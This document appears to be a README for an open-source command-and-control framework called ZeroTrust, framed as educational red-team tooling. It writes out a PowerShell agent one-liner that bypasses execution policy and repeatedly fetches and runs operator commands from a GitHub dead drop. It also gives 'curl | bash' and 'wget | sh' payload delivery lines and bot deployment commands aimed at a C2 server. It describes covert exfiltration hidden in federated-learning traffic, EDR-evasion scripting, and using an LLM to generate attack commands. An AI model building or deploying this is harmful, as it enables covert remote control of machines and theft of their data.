# ZeroTrust: Advanced Red Team C2 Framework

## 📋 Executive Summary

**ZeroTrust** (UI name: **ZeroTrace**) is a sophisticated command-and-control (C2) framework engineered for educational red teaming simulations and advanced persistent threat (APT) research. The platform combines **covert channel communication** (including **GitHub as a dead-drop C2 channel**), **federated learning-based command delivery**, and **Living-off-the-Land Binaries (LOLBINs)** to demonstrate advanced threat methodologies while maintaining educational integrity and security research compliance.

---

## 🎯 Core Functionality

### 1. **Covert Channel-Based Communication**

ZeroTrust implements stealth communication pathways that disguise malicious traffic as legitimate ML framework operations:

- **Traffic Masking**: Commands transmitted within federated learning model weight vectors
- **CryptoJS Encryption**: AES-encrypted command payloads preventing interception
- **Detection Evasion**: Network patterns replicate legitimate distributed ML communications
- **Multi-layer Abstraction**: Communication protocol appears benign to traditional network monitors

**How It Works:**
```
Operator Command → AI Translation → Encryption → 
Weight Embedding → Bot Retrieval → Command Execution → 
Result Exfiltration → Next Federated Round
```

### 2. **Living-off-the-Land Binaries (LOLBINs) as Payload Delivery**

ZeroTrust leverages system-native executables to execute reconnaissance commands without downloading malicious binaries:

**Key LOLBINs Used:**

| LOLBIN | Purpose | Example Command |
|--------|---------|-----------------|
| **PowerShell** | Command execution & data exfiltration | `Get-Process`, `netstat -an` |
| **CMD.exe** | Legacy command execution | Directory enumeration, system info |
| **Get-WmiObject** | System reconnaissance | Hardware inventory, installed software |
| **Get-ScheduledTask** | Persistence detection | Identify scheduled backdoors |
| **Get-ChildItem** | File system enumeration | Directory listing, hidden files |

**Advantages:**
- No malware signatures (legitimate system binaries)
- Enabled by default on all Windows systems
- Execution logged under normal system operations
- Reduced detection by antivirus/EDR solutions

### 3. **Federated Learning Protocol for C2 Communication**

The framework uses distributed machine learning rounds as a covert C2 channel:

**Federated Learning Workflow:**
1. **Round Initialization**: Coordinator announces active ML round
2. **Weight Distribution**: Global model weights (containing embedded commands) sent to bots
3. **Local Execution**: Bots execute embedded commands during "training"
4. **Update Submission**: Bot returns model updates + command output as training gradients
5. **Aggregation**: Coordinator extracts results and prepares next round
6. **Command Loop**: Process repeats for persistent C2 communication

**Key Advantage**: ML traffic is legitimate and expected in enterprise networks, making it virtually undetectable.

### 4. **GitHub as Covert Channel (Dead Drop C2)**

ZeroTrust uses a **GitHub repository as a covert dead-drop** for command delivery and result exfiltration. Because GitHub API traffic is indistinguishable from normal developer activity, this channel is highly resilient to network-level detection.

**How the GitHub Covert Channel Works:**

```
Operator (Dashboard)
    │
    ▼  POST /execute-command
Flask Backend
    │
    ▼  GitHub API PUT  ──►  commands/{bot_uuid}.txt  (in operator's GitHub repo)
                                     │
                        Bot polls every 5 seconds
                        GET /repos/{owner}/{repo}/contents/commands/{uuid}.txt
                                     │
                                     ▼
                        Execute PowerShell payload locally
                        Write output → results/{bot_uuid}.txt via GitHub API
                        Clear commands/{bot_uuid}.txt (dead-drop reset)
                                     │
Flask Backend  ◄──  GitHub API GET  results/{bot_uuid}.txt
    │
    ▼
Operator sees results in Dashboard
```

**Key Properties:**
- **No direct connection** between operator and bot — GitHub acts as intermediary
- **Legitimate-looking traffic** — all requests are standard GitHub REST API calls (`api.github.com`)
- **Self-clearing** — bot clears the commands file after execution to avoid re-execution
- **SHA-based conflict prevention** — GitHub's blob SHA is tracked to ensure atomic file updates
- **PAT-based authentication** — all API calls authenticated with a Personal Access Token (PAT)

**Required GitHub Setup:**

| Setting | Description | Where to Configure |
|---------|-------------|-------------------|
| **Personal Access Token (PAT)** | Token with `repo` scope | Dashboard → Configuration → GitHub Integration |
| **GitHub Username** | Repository owner | Dashboard → Configuration → GitHub Integration |
| **Repository Name** | Repo to use as dead drop (must exist) | Dashboard → Configuration → GitHub Integration |
| **Default Branch** | Branch for file operations (`main` / `master`) | Dashboard → Configuration → GitHub Integration |

**Agent Factory — GitHub Transport Channel:**

When building an agent in **Agent Factory**, selecting `GitHub` as the transport channel generates a self-contained PowerShell one-liner that embeds the PAT, repo coordinates, and bot UUID:

> ⚠️ **Security Note:** The generated agent embeds the PAT in plaintext within the command string. This means the token is visible in process listings, command history, and memory dumps on the target machine. This is an inherent trade-off of the dead-drop approach and is documented here for educational awareness. In a controlled lab environment, use a scoped, short-lived PAT with minimal permissions and rotate it after each engagement.

```powershell
# Generated one-liner (Windows — PowerShell LOLBin)
powershell -ExecutionPolicy Bypass -Command "
  $RepoOwner='<github_username>';
  $RepoName='<repo>';
  $BotID='<uuid>';
  $PAT='<pat>';
  $AuthHeader=@{Authorization=\"token $PAT\"};
  $CmdUrl=\"https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt\";
  $ResUrl=\"https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt\";
  while($true){
    $resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;
    $cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split \"\`n\";
    $cmdSha=$resp.sha;
    $results=@();
    foreach($c in $cmds){
      if(-not [string]::IsNullOrWhiteSpace($c)){
        $results+=(&([ScriptBlock]::Create($c)) | Out-String)
      }
    };
    # Write results back and clear commands
    ...
    Start-Sleep -Seconds 5
  }
"
```

**Supported Platforms via GitHub Channel:**

| Platform | Delivery Method |
|----------|----------------|
| **Windows** | `powershell -ExecutionPolicy Bypass` (PowerShell LOLBin) |
| **Linux** | `curl -s <raw_url> \| bash` |
| **macOS** | `curl -s <raw_url> \| bash` |
| **Android** | `wget -qO- <raw_url> \| sh` |

---

### 5. **AI-Powered Natural Language Command Translation**

The dashboard leverages **Groq API (GPT-OSS-120B)** to automatically generate Windows commands:

- **Input**: Natural language operational requirements ("show running processes")
- **Processing**: AI translates to optimal PowerShell/CMD syntax
- **Output**: Auto-execution on selected bot endpoints
- **Benefit**: Operators don't require command-line expertise

**Example Translation:**
```
Operator Query: "show all network connections"
    ↓
AI Processing: GPT-OSS-120B generates optimal command
    ↓
Generated Command: netstat -an | findstr ESTABLISHED
    ↓
Execution: Embedded in federated learning weight vector
    ↓
Result: Network reconnaissance data returned to dashboard
```

---

## 🏗️ Technical Architecture

### Technology Stack

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **C2 Dashboard** | Next.js 15.4.9, React 19.1.0, TypeScript | Web-based command interface & bot management |
| **Coordinator Backend** | Python 3.8+, Flask 3.0.0, MongoDB | Federated learning round management & bot registry |
| **Bot Agent** | PowerShell, WMI | Command execution on target systems |
| **Encryption** | CryptoJS 4.2.0 | AES encryption for command payloads |
| **AI Integration** | Groq API (GPT-OSS-120B) | Natural language to command translation |
| **UI Framework** | Tailwind CSS 4 | Modern responsive dashboard design |
| **Database** | MongoDB (via pymongo 4.6.3) | Bot registry & command/result storage |
| **Covert Channel** | GitHub REST API v3 | Dead-drop C2 via `commands/` and `results/` files |

### Communication Architecture

```
┌─────────────────────────────────────┐
│   Operator C2 Dashboard             │
│   (Next.js Web Interface)           │
│   - Bot selection & management      │
│   - Natural language commands       │
│   - Real-time output display        │
└────────────────┬────────────────────┘
                 │
        ┌────────▼──────────┐
        │  Groq AI Service  │
        │ (Command Generation)
        │ NL → PowerShell   │
        └────────┬──────────┘
                 │
     ┌───────────▼───────────┐
     │ CryptoJS Encryption   │
     │ (AES Obfuscation)     │
     │ - Payload encryption  │
     │ - Traffic masking     │
     └───────────┬───────────┘
                 │
     ┌───────────▼────────────────┐
     │ Federated Learning Protocol│
     │ (Weight-based C2)          │
     │ - Model weights embedded   │
     │ - Command delivery         │
     │ - Result exfiltration      │
     └───────────┬────────────────┘
                 │
        ┌────────┴────────┐
        ▼                 ▼
    ┌──────────┐     ┌──────────┐
    │ Bot Agent│     │ Bot Agent│
    │(PowerShell)    │ N        │
    └──────────┘     └──────────┘
```

### Project Structure

```
ZeroTrust/
├── app/                          # Next.js frontend (App Router)
│   ├── page.tsx                  # Login page (matrix rain UI)
│   ├── layout.tsx                # Root layout
│   ├── globals.css               # Global styles
│   ├── dashboard/                # Command Centre overview
│   ├── agentfactory/             # Agent builder (platform, capabilities, transport)
│   ├── agentsandfleet/           # Bot registry & management
│   ├── shell/[uuid]/             # Interactive shell per bot
│   ├── exfil/                    # Exfiltration operations
│   ├── federated/                # Federated learning C2 control
│   ├── aiassistant/              # Groq-powered NL command assistant
│   ├── config/                   # GitHub, Groq, MongoDB configuration
│   ├── components/               # Shared UI components (Sidebar, Header, etc.)
│   ├── api/
│   │   ├── groq/route.ts         # Groq API proxy (NL → PowerShell)
│   │   └── ai/route.ts           # AI command execution API
│   └── utils/                    # Auth helpers, MD5, etc.
├── backend/
│   ├── main.py                   # Flask server (bot registry, FL coordinator)
│   ├── train_step.py             # Local federated learning training step
│   └── requirements.txt          # Python dependencies
├── federated_learning_agent.ps1  # PowerShell bot agent
├── middleware.ts                  # Next.js auth middleware
├── next.config.ts
├── package.json
└── tsconfig.json
```

### Dashboard Modules

| Module | Path | Description |
|--------|------|-------------|
| **Overview** | `/dashboard` | Active agents, C2 channels, threat level stats |
| **Agent Factory** | `/agentfactory` | Build agents with custom capabilities & transport channels |
| **Agents & Fleet** | `/agentsandfleet` | Manage all registered bots (grid/table view, screenshot) |
| **Channels & Routing** | `/channels` | Configure C2 transport channels |
| **Payload Builder** | `/payload` | Build and configure payloads |
| **Stego Lab** | `/stego` | Steganography-based covert communication |
| **Exfil Ops** | `/exfil` | Data exfiltration operation management |
| **Mesh Visualizer** | `/mesh` | Network topology visualization |
| **AI Assistant** | `/aiassistant` | Groq-powered natural language → PowerShell assistant |
| **Federated Learning** | `/federated` | Start/stop FL rounds, monitor weight distribution |
| **Audit & Logs** | `/audit` | Operation audit trail and logging |
| **Configuration** | `/config` | GitHub PAT, Groq API key, MongoDB connection |

### Bot Agent Lifecycle

**Bot Configuration:**
```powershell
.\federated_learning_agent.ps1 `
  -CoordinatorUrl "http://c2-server:5000" `
  -ClientId "bot-001" `
  -MaxRounds 10000 `
  -SleepSeconds 5 `
  -Steps 10 `
  -VectorSize 512 `
  -Lr 0.01
```

**Execution Flow:**
1. Poll coordinator for active federated rounds
2. Fetch global model weights (containing commands)
3. Execute embedded PowerShell commands locally
4. Collect command output and system data
5. Perform "local training" (gradient computation)
6. Submit local updates (containing exfiltrated data)
7. Wait for next round with new commands

---

## 🔐 Security Features & Covert Techniques

### Detection Evasion Mechanisms

**1. Encryption & Obfuscation**
- CryptoJS AES-256 encryption for all command payloads
- Weight obfuscation: Commands encoded within ML model gradients
- Traffic normalization: C2 communications appear as legitimate federated learning

**2. Behavioral Mimicry**
- Network patterns replicate legitimate ML frameworks (Flower, TensorFlow Federated)
- Timing randomization: Configurable polling intervals prevent pattern detection
- Content blending: Commands disguised within training data exchanges

**3. Living-off-the-Land Execution**
- No external binary downloads
- Uses native Windows executables (PowerShell, WMI, CMD)
- Execution logged as standard system operations
- Antivirus signature evasion (system binaries are trusted)

**4. Authentication & Session Management**
- Cookie-based session tokens (Next.js middleware)
- Protected routes requiring valid authentication
- API endpoint access control via custom headers
- Bot client ID verification in federated protocol

---

## 🛡️ Anti-Prevention & Defense Mechanisms

### Process Monitoring & Termination Defense

To demonstrate the arms race between offensive and defensive security, ZeroTrust includes countermeasures against common EDR prevention techniques:

**Implementation: kill-notepad.ps1 (EDR Evasion Model)**

This script demonstrates how malware bypasses process-level defenses:

```powershell
# Multi-layered defense evasion approach

# 1. PRIVILEGE ESCALATION CHECK
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  return
}

# 2. EXECUTION WITH ADMIN CONTEXT
# Requires Administrator privileges to avoid detection by EDR

# 3. EVENT-DRIVEN MONITORING (WMI Events)
Register-WmiEvent -Class Win32_ProcessStartTrace -SourceIdentifier NotepadKiller -Action {
  # Real-time process creation events bypass traditional monitoring
}

# 4. POLLING FALLBACK MECHANISM
while ($true) {
  Get-Process -Name notepad -ErrorAction SilentlyContinue
  # Continuous monitoring ensures persistence even if WMI events fail
}

# 5. STEALTH EXECUTION
Start-Job { Stop-Process -Id $id -Force -ErrorAction SilentlyContinue }
# Jobs execute in separate PowerShell instances, bypassing parent process monitoring
```

**Defense Techniques Demonstrated:**

| Technique | Purpose | EDR Bypass |
|-----------|---------|-----------|
| **Admin Context Execution** | Terminate protected processes | Elevated privileges bypass user-mode hooks |
| **WMI Event Subscription** | Real-time process monitoring | WMI events logged differently than direct calls |
| **Job-based Execution** | Spawn independent PowerShell instances | Parent-child relationship breaking |
| **Polling Fallback** | Redundant mechanism if WMI fails | Defensive layering for reliability |
| **Error Suppression** | Silent failure without alerts | Stealth operation preventing detection |

**Security Research Value:**
- Demonstrates how malware maintains persistence against process termination
- Shows layered defense evasion (WMI + polling + job execution)
- Illustrates EDR limitations in handling native PowerShell operations
- Educational reference for blue team detection bypasses

---

## 📊 Operational Scenarios

### Scenario 1: System Intelligence Gathering
```
Operator: "list all running processes and services"
    ↓
AI Translation: 
  Get-Process | Select-Object Name, Id, CPU, Memory
  Get-Service | Select-Object Name, Status
    ↓
Execution: Embedded in federated round weights
    ↓
Result: Complete system inventory + resource usage returned to dashboard
```

### Scenario 2: Network Reconnaissance
```
Operator: "show established network connections"
    ↓
AI Translation: netstat -an | findstr ESTABLISHED
    ↓
Execution: Covert channel delivery
    ↓
Result: Active connection list for threat analysis
```

### Scenario 3: Persistence Verification
```
Operator: "list all scheduled tasks running as SYSTEM"
    ↓
AI Translation: 
  Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq 'NT AUTHORITY\SYSTEM'}
    ↓
Execution: Federated learning round embedding
    ↓
Result: Persistence mechanisms identified
```

---

## 🎓 Educational & Research Applications

### Red Team Training
- Simulate advanced C2 operations in isolated lab environments
- Teach operators how modern threat actors maintain persistence
- Demonstrate covert communication techniques
- Train incident response teams on C2 detection

### Penetration Testing
- Authorized security assessments with written permission
- Post-exploitation persistence mechanism validation
- Data exfiltration pathway testing
- Defense evasion capability assessment

### Blue Team Research
- Develop detection signatures for ML-based C2 communication
- Research behavioral analysis of federated learning anomalies
- EDR tuning for LOLBIN-based command execution
- Incident response playbook development

### Academic Security Research
- Novel covert channel investigation
- ML security intersection research
- Advanced persistent threat emulation
- Gradient-based data exfiltration analysis

---

## 🔧 Deployment Requirements

### Prerequisites
- **Windows 10/11** or compatible OS (for bot deployment)
- **Python 3.8+** (for coordinator backend)
- **Node.js 18+** (for dashboard frontend)
- **Groq API key** (for AI command generation)
- **Administrator privileges** (for sensitive operations)

### Dashboard Setup (Next.js Frontend)
```bash
npm install
echo "GROQ_API_KEY=your_groq_api_key_here" > .env.local
npm run dev           # Development server (http://localhost:3000)
npm run build         # Production build
npm start             # Production deployment
```

### Backend Setup (Flask Coordinator)
```bash
cd backend
pip install -r requirements.txt
python main.py        # Starts Flask server on http://localhost:5000
```

> **Note:** MongoDB must be running and accessible before starting the backend.

### Bot Deployment (PowerShell Agent)
```powershell
.\federated_learning_agent.ps1 `
  -CoordinatorUrl "http://your-c2-server:5000" `
  -ClientId "bot-001" `
  -MaxRounds 10000 `
  -SleepSeconds 5 `
  -VectorSize 100 `
  -Lr 0.05
```

### GitHub Repository Setup (Covert Channel)

Before building your first agent, configure a GitHub repository to serve as the C2 dead-drop:

1. **Create a new GitHub repository** (e.g., `c2-responder`) — can be private.
2. **Generate a Personal Access Token (PAT)** with the `repo` scope at `GitHub → Settings → Developer Settings → Personal Access Tokens`.
3. **Configure credentials in the dashboard** at `/config → GitHub Integration`:
   - Personal Access Token (PAT)
   - GitHub Username
   - Repository Name
   - Default Branch (`main` or `master`)

The backend will automatically create `commands/<uuid>.txt` and `results/<uuid>.txt` files in the repository when a new agent is registered.

### AI Assistant Setup
See [AI_ASSISTANT_SETUP.md](./AI_ASSISTANT_SETUP.md) for detailed Groq API configuration and example queries.

---

## ⚙️ GitHub Actions Workflows

ZeroTrust uses the following active GitHub Actions workflows to maintain code quality and dependency hygiene:

| Workflow | Trigger | Purpose |
|----------|---------|---------|
| **Copilot Code Review** | Pull requests | Automated AI-powered code review on every PR using GitHub Copilot |
| **Copilot Coding Agent** | Issues / manual dispatch | Delegates code tasks to the GitHub Copilot coding agent |
| **Dependabot Updates** | Scheduled | Automated dependency vulnerability scanning and update PRs |

### Workflow Details

**1. Copilot Code Review (`copilot-pull-request-reviewer`)**
- Runs on every pull request
- Uses GitHub Copilot to review changed files and suggest improvements
- Helps enforce security and code quality standards before merge

**2. Copilot Coding Agent (`copilot-swe-agent`)**
- Triggered via GitHub Issues labeled for Copilot or through manual workflow dispatch
- Allows the Copilot SWE agent to autonomously implement code changes
- Useful for automated feature development and bug fixes in a sandboxed environment

**3. Dependabot Updates (`dependabot-updates`)**
- Runs on a schedule to scan `package.json` (npm) and `requirements.txt` (pip) for known CVEs
- Automatically opens pull requests when updated dependency versions are available
- Keeps the framework's dependency chain free of publicly disclosed vulnerabilities

> **Tip:** All three workflows are visible under the **Actions** tab in the GitHub repository. The Dependabot workflow uses a dynamic path — you can monitor its badge at:
>
> [![Dependabot Updates](https://github.com/HackWidMaddy/ZeroTrust/actions/workflows/dependabot/dependabot-updates/badge.svg)](https://github.com/HackWidMaddy/ZeroTrust/actions)

---

## ⚠️ Legal & Ethical Framework

### Authorized Use Cases Only
- **Controlled lab environments** with isolated infrastructure
- **Authorized penetration testing** with written client consent
- **Academic research** with institutional oversight
- **Qualified cybersecurity professionals** only

### Strict Compliance Requirements
- **CFAA Compliance** (Computer Fraud & Abuse Act in US)
- **GDPR/CCPA** data protection regulations
- **Organization security policies** adherence
- **Professional ethics standards** (SANS, EC-Council)
- **Responsible disclosure** practices

### Prohibited Activities
- ❌ Unauthorized system access
- ❌ Unauthorized bot deployment
- ❌ Criminal or unethical activities
- ❌ Circumventing security without permission
- ❌ Data exfiltration for illicit purposes

---

## 🔑 Key Takeaways

1. **Covert Channel Innovation**: Federated learning AND GitHub dead-drop as dual C2 communication vectors
2. **LOLBIN Abuse**: System binary exploitation for payload delivery
3. **Detection Evasion**: Multi-layer obfuscation and behavioral mimicry
4. **AI-Powered Operations**: Natural language command generation
5. **Defense Mechanisms**: Educational demonstration of persistence techniques
6. **Security Research Value**: Advances blue team and detection capabilities
7. **GitHub-as-C2**: Demonstrates how legitimate cloud services (GitHub API) can be abused as covert channels

---

## 📝 Summary

ZeroTrust represents a **next-generation C2 framework** combining cutting-edge threat techniques (federated learning, **GitHub dead-drop channels**, LOLBIN abuse, covert channels) with **educational integrity** and **security research applications**. The framework demonstrates how modern threat actors maintain persistence while evading detection — including the novel abuse of trusted cloud services like GitHub as covert C2 channels — serving as a critical tool for red team training, penetration testing, and blue team defense research.

The anti-prevention mechanisms demonstrate the **adversarial arms race** between offense and defense, providing valuable insights for both attackers seeking to understand evasion techniques and defenders seeking to detect and mitigate advanced threats.

**Status**: Educational Framework | **Version**: 0.1.0 | **Author**: HackWidMaddy | **Last Updated**: March 2026
